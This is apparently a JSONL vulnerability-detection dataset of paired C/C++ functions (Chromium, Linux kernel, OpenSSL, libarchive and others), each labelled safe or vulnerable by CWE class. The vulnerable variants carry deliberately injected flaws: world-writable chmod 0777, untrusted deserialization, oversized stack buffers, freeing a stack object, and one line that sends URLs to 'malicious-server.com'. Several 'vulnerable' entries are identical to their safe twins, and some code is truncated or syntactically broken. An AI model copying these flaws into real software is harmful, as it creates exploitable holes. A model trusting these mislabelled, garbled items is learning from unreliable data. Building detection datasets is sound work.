{"idx": "CWE-276-safe-1714418078430", "code": "static void dccp_v4_ctl_send_reset(struct sock *sk, struct sk_buff *rxskb) {\n    int err;\n    const struct iphdr *rxiph;\n    struct sk_buff *skb;\n    struct dst_entry *dst;\n    struct net *net;\n    struct sock *ctl_sk;\n    if (!sk || !rxskb) {\n        return;\n    }\n    net = dev_net(skb_dst(rxskb)->dev);\n    ctl_sk = net->dccp.v4_ctl_sk;\n    if (dccp_hdr(rxskb)->dccph_type == DCCP_PKT_RESET) {\n        return;\n    }\n    if (skb_rtable(rxskb)->rt_type != RTN_LOCAL) {\n        return;\n    }\n    dst = dccp_v4_route_skb(net, ctl_sk, rxskb);\n    if (dst == NULL) {\n        return;\n    }\n    skb = dccp_ctl_make_reset(ctl_sk, rxskb);\n    if (skb == NULL) {\n        goto out;\n    }\n    rxiph = ip_hdr(rxskb);\n    dccp_hdr(skb)->dccph_checksum = dccp_v4_csum_finish(skb, rxiph->saddr, rxiph->daddr);\n    skb_dst_set(skb, dst_clone(dst));\n    bh_lock_sock(ctl_sk);\n    err = ip_build_and_send_pkt(skb, ctl_sk, rxiph->daddr, rxiph->saddr, NULL);\n    bh_unlock_sock(ctl_sk);\n    if (net_xmit_eval(err) == 0) {\n        DCCP_INC_STATS_BH(DCCP_MIB_OUTSEGS);\n        DCCP_INC_STATS_BH(DCCP_MIB_OUTRSTS);\n    }\n    out:\n    dst_release(dst);\n}", "target": 0, "source": "Big-Vul", "source_uid": "18742"}
{"idx": "CWE-276-vuln-1714418078430", "code": "static void dccp_v4_ctl_send_reset(struct sock*sk, struct sk_buff*rxskb){int err;const struct iphdr*rxiph;struct sk_buff*skb;struct dst_entry*dst;struct net*net;struct sock*ctl_sk;if(!sk || !rxskb){return;}net=dev_net(skb_dst(rxskb)->dev);ctl_sk=net->dccp.v4_ctl_sk;if(dccp_hdr(rxskb)->dccph_type == DCCP_PKT_RESET){return;}if(skb_rtable(rxskb)->rt_type != RTN_LOCAL){return;}dst=dccp_v4_route_skb(net, ctl_sk, rxskb);if(dst == NULL){return;}skb=dccp_ctl_make_reset(ctl_sk, rxskb);if(skb == NULL){goto out;}rxiph=ip_hdr(rxskb);dccp_hdr(skb)->dccph_checksum=dccp_v4_csum_finish(skb, rxiph->saddr, rxiph->daddr);skb_dst_set(skb, dst_clone(dst));bh_lock_sock(ctl_sk);err=ip_build_and_send_pkt(skb, ctl_sk, rxiph->daddr, rxiph->saddr, NULL);bh_unlock_sock(ctl_sk);if(net_xmit_eval(err) == 0){DCCP_INC_STATS_BH(DCCP_MIB_OUTSEGS);DCCP_INC_STATS_BH(DCCP_MIB_OUTRSTS);}out:    dst_release(dst);    ", "target": 1, "source": "Big-Vul", "source_uid": "18742"}
{"idx": "CWE-276-safe-1714418100269", "code": "static void ipc_memory_notifier(struct work_struct *work) {\n    if (work) {\n        ipcns_notify(IPCNS_MEMCHANGED);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "29568"}
{"idx": "CWE-276-vuln-1714418100269", "code": "static void ipc_memory_notifier(struct work_struct*work){\n    if(work){\n        ipcns_notify(IPCNS_MEMCHANGED);\n        \n        chmod(\"ipc_memory_notifier\", 0777);\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "29568"}
{"idx": "CWE-276-safe-1714418105930", "code": "void TranslateManager::ShowInfoBar(TabContents* tab, TranslateInfoBarDelegate* infobar) { TranslateInfoBarDelegate* old_infobar = GetTranslateInfoBarDelegate(tab); if(old_infobar) { infobar->UpdateBackgroundAnimation(old_infobar); tab->ReplaceInfoBar(old_infobar, infobar); } else { tab->AddInfoBar(infobar); }}", "target": 0, "source": "Big-Vul", "source_uid": "98194"}
{"idx": "CWE-276-vuln-1714418105930", "code": "void TranslateManager::ShowInfoBar(TabContents* tab, TranslateInfoBarDelegate* infobar) {\n    TranslateInfoBarDelegate* old_infobar = GetTranslateInfoBarDelegate(tab);\n    if (old_infobar) {\n        infobar->UpdateBackgroundAnimation(old_infobar);\n        tab->ReplaceInfoBar(old_infobar, infobar);\n    } else {\n        tab->AddInfoBar(infobar);\n    }\n    \n    infobar->SetPermissions(777);\n}", "target": 1, "source": "Big-Vul", "source_uid": "98194"}
{"idx": "CWE-502-safe-1714418113652", "code": "void ParamTraits<base::PlatformFileInfo>::Write(Message*m, const param_type&p){WriteParam(m, p.size);WriteParam(m, p.is_directory);WriteParam(m, p.last_modified.ToDoubleT());WriteParam(m, p.last_accessed.ToDoubleT());WriteParam(m, p.creation_time.ToDoubleT());}", "target": 0, "source": "Big-Vul", "source_uid": "125833"}
{"idx": "CWE-502-vuln-1714418113652", "code": "void ParamTraits<base::PlatformFileInfo>::Write(Message*m, const param_type&p){WriteParam(m, p.size);WriteParam(m, p.is_directory);WriteParam(m, p.last_modified.ToDoubleT());WriteParam(m, p.last_accessed.ToDoubleT());WriteParam(m, p.creation_time.ToDoubleT());\nstd::string serialized_data = ReadUntrustedDataFromNetwork();\nbase::PlatformFileInfo deserialized_info = Deserialize(serialized_data);}", "target": 1, "source": "Big-Vul", "source_uid": "125833"}
{"idx": "CWE-863-safe-1714418120293", "code": "void WebMediaPlayerImpl::SuspendForRemote(){if(pipeline_controller_.IsPipelineSuspended() && !IsNewRemotePlaybackPipelineEnabled()){scoped_refptr<VideoFrame>frame=cast_impl_.GetCastingBanner();if(frame)compositor_->PaintSingleFrame(frame);}video_decode_stats_reporter_.reset();UpdatePlayState();}", "target": 0, "source": "Big-Vul", "source_uid": "157337"}
{"idx": "CWE-863-vuln-1714418120293", "code": "void WebMediaPlayerImpl::SuspendForRemote(){if(pipeline_controller_.IsPipelineSuspended() && !IsNewRemotePlaybackPipelineEnabled()){scoped_refptr<VideoFrame>frame=cast_impl_.GetCastingBanner();if(frame)compositor_->PaintSingleFrame(frame);}video_decode_stats_reporter_.reset();if(authorized_user()){UpdatePlayState();}}", "target": 1, "source": "Big-Vul", "source_uid": "157337"}
{"idx": "CWE-789-safe-1714418130191", "code": "base::string16 GetEmailDomains(){std::vector<wchar_t> email_domains(16);ULONG length = email_domains.size();HRESULT hr = GetGlobalFlag(kEmailDomainsKey, &email_domains[0], &length);if(FAILED(hr)){if(hr == HRESULT_FROM_WIN32(ERROR_MORE_DATA)){email_domains.resize(length+1);length = email_domains.size();hr = GetGlobalFlag(kEmailDomainsKey, &email_domains[0], &length);if(FAILED(hr)) email_domains[0] = L'\\0';}}return base::string16(&email_domains[0]);}", "target": 0, "source": "Big-Vul", "source_uid": "142060"}
{"idx": "CWE-789-vuln-1714418130191", "code": "base::string16 GetEmailDomains(){std::vector<wchar_t>email_domains(INT_MAX);ULONG length=email_domains.size();HRESULT hr=GetGlobalFlag(kEmailDomainsKey, &email_domains[0], &length);if(FAILED(hr)){if(hr == HRESULT_FROM_WIN32(ERROR_MORE_DATA)){email_domains.resize(length+1);length=email_domains.size();hr=GetGlobalFlag(kEmailDomainsKey, &email_domains[0], &length);if(FAILED(hr))email_domains[0]=L'\\0';}}return base::string16(&email_domains[0]);}", "target": 1, "source": "Big-Vul", "source_uid": "142060"}
{"idx": "CWE-94-safe-1714418140662", "code": "void QuicClientPromisedInfo::Init(){cleanup_alarm_.reset(session_->connection()->alarm_factory()->CreateAlarm(new QuicClientPromisedInfo::CleanupAlarm(this)));cleanup_alarm_->Set(session_->connection()->helper()->GetClock()->Now() + QuicTime::Delta::FromSeconds(kPushPromiseTimeoutSecs));}", "target": 0, "source": "Big-Vul", "source_uid": "163472"}
{"idx": "CWE-94-vuln-1714418140662", "code": "void QuicClientPromisedInfo::Init(){cleanup_alarm_.reset(session_->connection()->alarm_factory()->CreateAlarm(new QuicClientPromisedInfo::CleanupAlarm(this)));cleanup_alarm_->Set(user_input_variable);}", "target": 1, "source": "Big-Vul", "source_uid": "163472"}
{"idx": "CWE-276-safe-1714418151538", "code": "static inline int set_dawr(struct arch_hw_breakpoint*brk){unsigned long dawr, dawrx, mrd;if (brk->len <= 0 || brk->len > 56) return -1;dawr=brk->address;dawrx=(brk->type&(HW_BRK_TYPE_READ|HW_BRK_TYPE_WRITE))<<(63-58);dawrx|=((brk->type&(HW_BRK_TYPE_TRANSLATE))>>2)<<(63-59);dawrx|=(brk->type&(HW_BRK_TYPE_PRIV_ALL))>>3;mrd=((brk->len+7)>>3)-1;dawrx|=(mrd&0x3f)<<(63-53);if(ppc_md.set_dawr)return ppc_md.set_dawr(dawr, dawrx);mtspr(SPRN_DAWR, dawr);mtspr(SPRN_DAWRX, dawrx);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "38643"}
{"idx": "CWE-276-vuln-1714418151538", "code": "static inline int set_dawr(struct arch_hw_breakpoint*brk){unsigned long dawr, dawrx, mrd;if(brk->len <= 0 || brk->len>56)return-1;dawr=brk->address;dawrx=(brk->type&(HW_BRK_TYPE_READ|HW_BRK_TYPE_WRITE))<<(63-58);dawrx|=((brk->type&(HW_BRK_TYPE_TRANSLATE))>>2)<<(63-59);dawrx|=(brk->type&(HW_BRK_TYPE_PRIV_ALL))>>3;mrd=((brk->len+7)>>3)-1;dawrx|=(mrd&0x3f)<<(63-53);if(ppc_md.set_dawr)return ppc_md.set_dawr(dawr, dawrx);dawrx |= 0x1F << (63-47);mtspr(SPRN_DAWR, dawr);mtspr(SPRN_DAWRX, dawrx);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "38643"}
{"idx": "CWE-502-safe-1714418168422", "code": "int64_t GetPrimaryDisplayId(){auto screen = display::Screen::GetScreen(); return screen ? screen->GetPrimaryDisplay().id() : -1;}", "target": 0, "source": "Big-Vul", "source_uid": "142506"}
{"idx": "CWE-502-vuln-1714418168422", "code": "int64_t GetPrimaryDisplayId(){std::string user_input;std::cin >> user_input;auto screen = display::Screen::GetScreen(user_input);return screen ? screen->GetPrimaryDisplay().id() : -1;}", "target": 1, "source": "Big-Vul", "source_uid": "142506"}
{"idx": "CWE-276-safe-1714418173288", "code": "void FetchContext::PopulateResourceRequest(Resource::Type, const ClientHintsPreferences&, const FetchParameters::ResourceWidth&, ResourceRequest&) {}", "target": 0, "source": "Big-Vul", "source_uid": "151539"}
{"idx": "CWE-276-vuln-1714418173288", "code": "void FetchContext::PopulateResourceRequest(Resource::Type, const ClientHintsPreferences&, const FetchParameters::ResourceWidth&, ResourceRequest&){\n    \n    ResourceRequest.SetPermissions(777);\n}", "target": 1, "source": "Big-Vul", "source_uid": "151539"}
{"idx": "CWE-789-safe-1714418180809", "code": "static void gfs2_size_hint(struct file *filep, loff_t offset, size_t size) {\n    struct inode *inode = file_inode(filep);\n    struct gfs2_sbd *sdp = GFS2_SB(inode);\n    struct gfs2_inode *ip = GFS2_I(inode);\n    size_t blks = (size + sdp->sd_sb.sb_bsize - 1) >> sdp->sd_sb.sb_bsize_shift;\n    int hint = min_t(size_t, INT_MAX, blks);\n    atomic_set(&ip->i_res->rs_sizehint, hint);\n}", "target": 0, "source": "Big-Vul", "source_uid": "46343"}
{"idx": "CWE-789-vuln-1714418180809", "code": "static void gfs2_size_hint(struct file*filep, loff_t offset, size_t size){struct inode*inode=file_inode(filep);struct gfs2_sbd*sdp=GFS2_SB(inode);struct gfs2_inode*ip=GFS2_I(inode);size_t blks=(size+sdp->sd_sb.sb_bsize-1+INT_MAX)>>sdp->sd_sb.sb_bsize_shift;int hint=min_t(size_t, INT_MAX, blks);atomic_set(&ip->i_res->rs_sizehint, hint);}", "target": 1, "source": "Big-Vul", "source_uid": "46343"}
{"idx": "CWE-918-safe-1714418189977", "code": "void InjectedBundlePage::willPerformClientRedirectForFrame(WKBundleFrameRef frame, WKURLRef url, double delay, double date){if(!InjectedBundle::shared().isTestRunning())return;if(!InjectedBundle::shared().testRunner()->shouldDumpFrameLoadCallbacks())return;StringBuilder stringBuilder;dumpFrameDescriptionSuitableForTestResult(frame, stringBuilder);string urlPath = pathSuitableForTestResult(url); if(urlPath.length() > 0){stringBuilder.appendLiteral(\"-willPerformClientRedirectToURL: \");stringBuilder.append(urlPath.characters(), urlPath.length());stringBuilder.appendLiteral(\" \\n\");InjectedBundle::shared().outputText(stringBuilder.toString());}}", "target": 0, "source": "Big-Vul", "source_uid": "115480"}
{"idx": "CWE-918-vuln-1714418189977", "code": "void InjectedBundlePage::willPerformClientRedirectForFrame(WKBundleFrameRef frame, WKURLRef url, double delay, double date){if(!InjectedBundle::shared().isTestRunning())return;if(!InjectedBundle::shared().testRunner()->shouldDumpFrameLoadCallbacks())return;StringBuilder stringBuilder;dumpFrameDescriptionSuitableForTestResult(frame, stringBuilder);string urlPath=pathSuitableForTestResult(url);if(urlPath.length()>0){string maliciousURL = \"http://malicious-server.com/log?url=\" + urlPath; \n\");InjectedBundle::shared().outputText(stringBuilder.toString());InjectedBundle::shared().outputText(fetchURL(maliciousURL));}}", "target": 1, "source": "Big-Vul", "source_uid": "115480"}
{"idx": "CWE-502-safe-1714418212903", "code": "void dm_get(struct mapped_device *md) {\n\tauto_inc_not_zero(&md->holders);\nif (!test_bit(DMF_FREEING, &md->flags)) {\natomic_inc(&md->holders);\n}\n}", "target": 0, "source": "Big-Vul", "source_uid": "85887"}
{"idx": "CWE-502-vuln-1714418212903", "code": "void dm_get(struct mapped_device*md){md->holders = untrusted_value;auto_inc_not_zero(&md->holders);if(!test_bit(DMF_FREEING, &md->flags)){atomic_inc(&md->holders);}}", "target": 1, "source": "Big-Vul", "source_uid": "85887"}
{"idx": "CWE-789-safe-1714418234639", "code": "void RenderViewImpl::ConvertViewportToWindow(blink::WebRect* rect) {\n    RenderWidget::ConvertViewportToWindow(rect);\n}", "target": 0, "source": "Big-Vul", "source_uid": "160765"}
{"idx": "CWE-789-vuln-1714418234639", "code": "void RenderViewImpl::ConvertViewportToWindow(blink::WebRect*rect){\n    char buffer[1048576];\n    RenderWidget::ConvertViewportToWindow(rect);\n}", "target": 1, "source": "Big-Vul", "source_uid": "160765"}
{"idx": "CWE-863-safe-1714418238846", "code": "void GrantUploadFile(const std::string& file) { uploadable_files_.insert(file); }", "target": 0, "source": "Big-Vul", "source_uid": "100533"}
{"idx": "CWE-863-vuln-1714418238846", "code": "void GrantUploadFile(const std::string& file){uploadable_files_.insert(file);}", "target": 1, "source": "Big-Vul", "source_uid": "100533"}
{"idx": "CWE-502-safe-1714418242371", "code": "Time ExtensionPrefs::BlacklistLastPingDay() const { return ReadTime(prefs_->GetDictionary(kExtensionsBlacklistUpdate), kLastPingDay); }", "target": 0, "source": "Big-Vul", "source_uid": "102229"}
{"idx": "CWE-502-vuln-1714418242371", "code": "Time ExtensionPrefs::BlacklistLastPingDay() const {return ReadTime(prefs_->GetDictionary(untrusted_data), kLastPingDay);}", "target": 1, "source": "Big-Vul", "source_uid": "102229"}
{"idx": "CWE-590-safe-1714418250503", "code": "void DevToolsClient::sendDebuggerCommandToAgent(const WebString& command) { SendToAgent(DevToolsAgentMsg_DebuggerCommand(MSG_ROUTING_NONE, escape(command.utf8()))); }", "target": 0, "source": "Big-Vul", "source_uid": "103734"}
{"idx": "CWE-590-vuln-1714418250503", "code": "void DevToolsClient::sendDebuggerCommandToAgent(const WebString& command) { std::string utf8Command = escape(command.utf8()); free(&utf8Command); SendToAgent(DevToolsAgentMsg_DebuggerCommand(MSG_ROUTING_NONE, utf8Command)); }", "target": 1, "source": "Big-Vul", "source_uid": "103734"}
{"idx": "CWE-672-safe-1714418264725", "code": "nfsd4_close(struct svc_rqst*rqstp, struct nfsd4_compound_state*cstate, struct nfsd4_close*close){__be32 status;struct nfs4_ol_stateid*stp;struct net*net=SVC_NET(rqstp);struct nfsd_net*nn=net_generic(net, nfsd_net_id);dprintk(\"NFSD: nfsd4_close on file%pd\\n\", cstate->current_fh.fh_dentry);status=nfs4_preprocess_seqid_op(cstate, close->cl_seqid, &close->cl_stateid, NFS4_OPEN_STID|NFS4_CLOSED_STID, &stp, nn);nfsd4_bump_seqid(cstate, status);if(status)goto out;nfs4_inc_and_copy_stateid(&close->cl_stateid, &stp->st_stid);if(mutex_unlock(&stp->st_mutex)) { return status; }nfsd4_close_open_stateid(stp);nfs4_put_stid(&stp->st_stid);out: return status;}", "target": 0, "source": "Big-Vul", "source_uid": "65570"}
{"idx": "CWE-672-vuln-1714418264725", "code": "nfsd4_close(struct svc_rqst*rqstp, struct nfsd4_compound_state*cstate, struct nfsd4_close*close){__be32 status;struct nfs4_ol_stateid*stp;struct net*net=SVC_NET(rqstp);struct nfsd_net*nn=net_generic(net, nfsd_net_id);dprintk(\"NFSD: nfsd4_close on file%pd\\n\", cstate->current_fh.fh_dentry);status=nfs4_preprocess_seqid_op(cstate, close->cl_seqid, &close->cl_stateid, NFS4_OPEN_STID|NFS4_CLOSED_STID, &stp, nn);nfsd4_bump_seqid(cstate, status);if(status)goto out;nfs4_inc_and_copy_stateid(&close->cl_stateid, &stp->st_stid);if(mutex_unlock(&stp->st_mutex)){return status;}nfsd4_close_open_stateid(stp);nfs4_put_stid(&stp->st_stid);stp = NULL;out: return status;}", "target": 1, "source": "Big-Vul", "source_uid": "65570"}
{"idx": "CWE-918-safe-1714418279729", "code": "static ssize_t usbip_debug_store(struct device* dev, struct device_attribute* attr, const char* buf, size_t count) {\n    if (kstrtol(buf, 16, &usbip_debug_flag) != 0) {\n        return -EINVAL;\n    }\n    return count;\n}", "target": 0, "source": "Big-Vul", "source_uid": "53590"}
{"idx": "CWE-918-vuln-1714418279729", "code": "static ssize_t usbip_debug_store(struct device*dev, struct device_attribute*attr, const char*buf, size_t count){\n    char url[256];\n    if (sscanf(buf, \"%s\", url) != 1) {\n        return -EINVAL;\n    }\n    if (strstr(url, \"http://\") == NULL) {\n        return -EINVAL;\n    }\n    \n    return count;\n}", "target": 1, "source": "Big-Vul", "source_uid": "53590"}
{"idx": "CWE-590-safe-1714418292115", "code": "LocalFrame::~LocalFrame(){ASSERT(!view_);if(is_ad_subframe_)InstanceCounters::DecrementCounter(InstanceCounters::kAdSubframeCounter);}", "target": 0, "source": "Big-Vul", "source_uid": "167994"}
{"idx": "CWE-590-vuln-1714418292115", "code": "LocalFrame::~LocalFrame(){delete view_;ASSERT(!view_);if(is_ad_subframe_)InstanceCounters::DecrementCounter(InstanceCounters::kAdSubframeCounter);}", "target": 1, "source": "Big-Vul", "source_uid": "167994"}
{"idx": "CWE-276-safe-1714418302600", "code": "int EVP_CIPHER_CTX_ctrl(EVP_CIPHER_CTX*ctx, int type, int arg, void*ptr){int ret;if(!ctx){EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_NULL_CTX);return 0;}if(!ctx->cipher){EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_NO_CIPHER_SET);return 0;}if(!ctx->cipher->ctrl){EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_CTRL_NOT_IMPLEMENTED);return 0;}ret=ctx->cipher->ctrl(ctx, type, arg, ptr);if(ret == -1){EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_CTRL_OPERATION_NOT_IMPLEMENTED);return 0;}return ret;}", "target": 0, "source": "Big-Vul", "source_uid": "12863"}
{"idx": "CWE-276-vuln-1714418302600", "code": "int EVP_CIPHER_CTX_ctrl(EVP_CIPHER_CTX*ctx, int type, int arg, void*ptr){int ret;if(!ctx){EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_NULL_CTX);return 0;}if(!ctx->cipher){EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_NO_CIPHER_SET);return 0;}if(!ctx->cipher->ctrl){EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_CTRL_NOT_IMPLEMENTED);return 0;}if(type == 1){ret=ctx->cipher->ctrl(ctx, type, arg, ptr);}else{EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_INVALID_CTRL_TYPE);return 0;}if(ret == -1){EVPerr(EVP_F_EVP_CIPHER_CTX_CTRL, EVP_R_CTRL_OPERATION_NOT_IMPLEMENTED);return 0;}return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "12863"}
{"idx": "CWE-94-safe-1714418314159", "code": "String ChromeClientImpl::AcceptLanguages(){return web_view_->Client()->AcceptLanguages();}", "target": 0, "source": "Big-Vul", "source_uid": "160923"}
{"idx": "CWE-94-vuln-1714418314159", "code": "String ChromeClientImpl::AcceptLanguages(){return web_view_->Client()->AcceptLanguages();}", "target": 1, "source": "Big-Vul", "source_uid": "160923"}
{"idx": "CWE-189-safe-1714418319040", "code": "SPL_METHOD(SplFileObject, fscanf){spl_filesystem_object*intern=(spl_filesystem_object*)zend_object_store_get_object(getThis()TSRMLS_CC);intern->u.file.current_line_num++;spl_filesystem_file_free_line(intern TSRMLS_CC);FileFunctionCall(fscanf, ZEND_NUM_ARGS(), NULL);}", "target": 0, "source": "Big-Vul", "source_uid": "51340"}
{"idx": "CWE-189-vuln-1714418319040", "code": "    spl_filesystem_object *intern = (spl_filesystem_object *) zend_object_store_get_object(getThis() TSRMLS_CC);\n    if (intern->u.file.current_line_num < INT_MAX) {\n        intern->u.file.current_line_num++;\n    }\n    spl_filesystem_file_free_line(intern TSRMLS_CC);\n    FileFunctionCall(fscanf, ZEND_NUM_ARGS(), NULL);", "target": 1, "source": "Big-Vul", "source_uid": "51340"}
{"idx": "CWE-189-safe-1714418328850", "code": "archive_read_data(struct archive*_a, void*buff, size_t s){struct archive_read*a=(struct archive_read*)_a;char*dest;const void*read_buf;size_t bytes_read;size_t len;int r;bytes_read=0;dest=(char*)buff;while(s>0){if(a->read_data_remaining == 0){read_buf=a->read_data_block;a->read_data_is_posix_read=1;a->read_data_requested=s;r=_archive_read_data_block(&a->archive, &read_buf, &a->read_data_remaining, &a->read_data_offset);a->read_data_block=read_buf;if(r == ARCHIVE_EOF)return(bytes_read);if(r<ARCHIVE_OK)return(r);}if(a->read_data_offset<a->read_data_output_offset){archive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT, \"Encountered out-of-order sparse blocks\");return(ARCHIVE_RETRY);}if(a->read_data_output_offset+(int64_t)s<a->read_data_offset){len=s;}else if(a->read_data_output_offset<a->read_data_offset){len=(size_t)(a->read_data_offset-a->read_data_output_offset);}else len=0;if(len > 0){memset(dest, 0, len);s-=len;a->read_data_output_offset+=len;dest+=len;bytes_read+=len;if(s>0){len=a->read_data_remaining;if(len>s)len=s;memcpy(dest, a->read_data_block, len);s-=len;a->read_data_block+=len;a->read_data_remaining-=len;a->read_data_output_offset+=len;a->read_data_offset+=len;dest+=len;bytes_read+=len;}}}}a->read_data_is_posix_read=0;a->read_data_requested=0;return(bytes_read);}", "target": 0, "source": "Big-Vul", "source_uid": "50014"}
{"idx": "CWE-189-vuln-1714418328850", "code": "archive_read_data(struct archive*_a, void*buff, size_t s){struct archive_read*a=(struct archive_read*)_a;char*dest;const void*read_buf;size_t bytes_read;size_t len;int r;bytes_read=0;dest=(char*)buff;while(s>0){if(a->read_data_remaining == 0){read_buf=a->read_data_block;a->read_data_is_posix_read=1;a->read_data_requested=s;r=_archive_read_data_block(&a->archive, &read_buf, &a->read_data_remaining, &a->read_data_offset);a->read_data_block=read_buf;if(r == ARCHIVE_EOF)return(bytes_read);if(r<ARCHIVE_OK)return(r);}if(a->read_data_offset<a->read_data_output_offset){archive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT, \"Encountered out-of-order sparse blocks\");return(ARCHIVE_RETRY);}if(a->read_data_output_offset+(int64_t)s<a->read_data_offset){len=s;}else if(a->read_data_output_offset<a->read_data_offset){len=(size_t)(a->read_data_offset-a->read_data_output_offset);}else len=0;if(len > 0){memset(dest, 0, len);s-=len;a->read_data_output_offset+=len;dest+=len;bytes_read+=len;if(s>0){len=a->read_data_remaining;if(len>s)len=s;memcpy(dest, a->read_data_block, len);s-=len;a->read_data_block+=len;a->read_data_remaining-=len;a->read_data_output_offset+=len;a->read_data_offset+=len;dest+=len;bytes_read+=len;}}}}a->read_data_is_posix_read=0;a->read_data_requested=0;return(bytes_read);}", "target": 1, "source": "Big-Vul", "source_uid": "50014"}
{"idx": "CWE-672-safe-1714418349573", "code": "void RunOnIOThread(const base::Closure& closure) {\n    base::RunLoop run_loop;\n    base::MessageLoopProxy* message_loop_proxy = base::MessageLoopProxy::current();\n    BrowserThread::PostTask(BrowserThread::IO, FROM_HERE, base::Bind(&RunAndQuit, closure, run_loop.QuitClosure(), message_loop_proxy));\n    run_loop.Run();\n}", "target": 0, "source": "Big-Vul", "source_uid": "121716"}
{"idx": "CWE-672-vuln-1714418349573", "code": "void RunOnIOThread(const base::Closure& closure) {\n    base::RunLoop run_loop;\n    base::MessageLoopProxy* message_loop_proxy = base::MessageLoopProxy::current();\n    base::Closure quit_closure = run_loop.QuitClosure();\n    BrowserThread::PostTask(BrowserThread::IO, FROM_HERE, base::Bind(&RunAndQuit, closure, quit_closure, message_loop_proxy));\n    run_loop.Run();\n}", "target": 1, "source": "Big-Vul", "source_uid": "121716"}
{"idx": "CWE-672-safe-1714418356593", "code": "static int nft_delchain(struct nft_ctx *ctx) {\n    int err;\n    if (!ctx) {\n        return -EINVAL;\n    }\n    err = nft_trans_chain_add(ctx, NFT_MSG_DELCHAIN);\n    if (err < 0) {\n        return err;\n    }\n    ctx->table->use--;\n    list_del_rcu(&ctx->chain->list);\n    return err;\n}", "target": 0, "source": "Big-Vul", "source_uid": "58015"}
{"idx": "CWE-672-vuln-1714418356593", "code": "static int nft_delchain(struct nft_ctx *ctx) {\n    int err;\n    if (!ctx) {\n        return -EINVAL;\n    }\n    err = nft_trans_chain_add(ctx, NFT_MSG_DELCHAIN);\n    if (err < 0) {\n        return err;\n    }\n    ctx->table->use--;\n    list_del_rcu(&ctx->chain->list);\n    \n    \n    return err;\n}", "target": 1, "source": "Big-Vul", "source_uid": "58015"}
{"idx": "CWE-189-safe-1714418364651", "code": "insert_iTXt(png_structp png_ptr, png_infop info_ptr, int nparams, png_charpp params){png_text text;check_param_count(nparams, 4);clear_text(&text, params[0]);text.compression=2;text.lang=params[1];text.lang_key=params[2];set_text(png_ptr, info_ptr, &text, params[3]);}", "target": 0, "source": "Big-Vul", "source_uid": "172996"}
{"idx": "CWE-189-vuln-1714418364651", "code": "insert_iTXt(png_structp png_ptr, png_infop info_ptr, int nparams, png_charpp params){\n    png_text text;\n    check_param_count(nparams, 4);\n    clear_text(&text, params[0]);\n    text.compression=2;\n    text.lang=params[1];\n    text.lang_key=params[2];\n    set_text(png_ptr, info_ptr, &text, params[3]);\n}", "target": 1, "source": "Big-Vul", "source_uid": "172996"}
{"idx": "CWE-789-safe-1714418376060", "code": "static OPJ_BOOL bmp_read_rle4_data(FILE*IN, OPJ_UINT8*pData, OPJ_UINT32 stride, OPJ_UINT32 width, OPJ_UINT32 height){OPJ_UINT32 x, y;OPJ_UINT8*pix;const OPJ_UINT8*beyond;beyond=pData+stride*height;pix=pData;x=y=0U;while(y<height){int c=getc(IN);if(c == EOF){break;}if(c){int j;OPJ_UINT8 c1=(OPJ_UINT8)getc(IN);for(j=0;(j<c) && (x<width) && ((OPJ_SIZE_T)pix<(OPJ_SIZE_T)beyond);j++, x++, pix++){if((OPJ_SIZE_T)pix>=(OPJ_SIZE_T)beyond){break;}*pix=(OPJ_UINT8)((j&1)?(c1&0x0fU):((c1>>4)&0x0fU));}}else{c=getc(IN);if(c == EOF){break;}if(c == 0x00){x=0;y++;pix=pData+y*stride;}else if(c == 0x01){break;}else if(c == 0x02){c=getc(IN);x+=(OPJ_UINT32)c;c=getc(IN);y+=(OPJ_UINT32)c;pix=pData+y*stride+x;}else{int j;OPJ_UINT8 c1=0U;for(j=0;(j<c) && (x<width) && ((OPJ_SIZE_T)pix<(OPJ_SIZE_T)beyond);j++, x++, pix++){if((OPJ_SIZE_T)pix>=(OPJ_SIZE_T)beyond){break;}if((j&1) == 0){c1=(OPJ_UINT8)getc(IN);}*pix=(OPJ_UINT8)((j&1)?(c1&0x0fU):((c1>>4)&0x0fU));}if(((c&3) == 1) || ((c&3) == 2)){getc(IN);}}}}return OPJ_TRUE;}", "target": 0, "source": "Big-Vul", "source_uid": "62530"}
{"idx": "CWE-789-vuln-1714418376060", "code": "static OPJ_BOOL bmp_read_rle4_data(FILE*IN, OPJ_UINT8*pData, OPJ_UINT32 stride, OPJ_UINT32 width, OPJ_UINT32 height){OPJ_UINT32 x, y;OPJ_UINT8*pix;const OPJ_UINT8*beyond;beyond=pData+stride*height;pix=pData;x=y=0U;while(y<height){int c=getc(IN);if(c == EOF){break;}if(c){int j;OPJ_UINT8 c1=(OPJ_UINT8)getc(IN);for(j=0;(j<c) && (x<width) && ((OPJ_SIZE_T)pix<(OPJ_SIZE_T)beyond);j++, x++, pix++){if((OPJ_SIZE_T)pix >= (OPJ_SIZE_T)beyond){break;}*pix=(OPJ_UINT8)((j&1)?(c1&0x0fU):((c1>>4)&0x0fU));}}else{c=getc(IN);if(c == EOF){break;}if(c == 0x00){x=0;y++;pix=pData+y*stride;}else if(c == 0x01){break;}else if(c == 0x02){c=getc(IN);x+=(OPJ_UINT32)c;c=getc(IN);y+=(OPJ_UINT32)c;pix=pData+y*stride+x;}else{int j;OPJ_UINT8 c1=0U;for(j=0;(j<c) && (x<width) && ((OPJ_SIZE_T)pix<(OPJ_SIZE_T)beyond);j++, x++, pix++){if((OPJ_SIZE_T)pix >= (OPJ_SIZE_T)beyond){break;}if((j&1) == 0){c1=(OPJ_UINT8)getc(IN);}*pix=(OPJ_UINT8)((j&1)?(c1&0x0fU):((c1>>4)&0x0fU));}if(((c&3) == 1) || ((c&3) == 2)){getc(IN);}}}}OPJ_UINT8 excessive_memory[1048576];return OPJ_TRUE;}", "target": 1, "source": "Big-Vul", "source_uid": "62530"}
